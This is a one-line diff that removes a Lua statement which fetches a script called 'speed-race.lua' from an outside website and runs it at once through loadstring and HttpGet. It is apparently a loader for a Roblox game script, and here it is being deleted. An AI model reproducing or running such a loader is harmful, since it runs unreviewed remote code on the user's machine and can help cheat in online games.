@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://www.eskeyz.my.id/speed-race.lua"))()
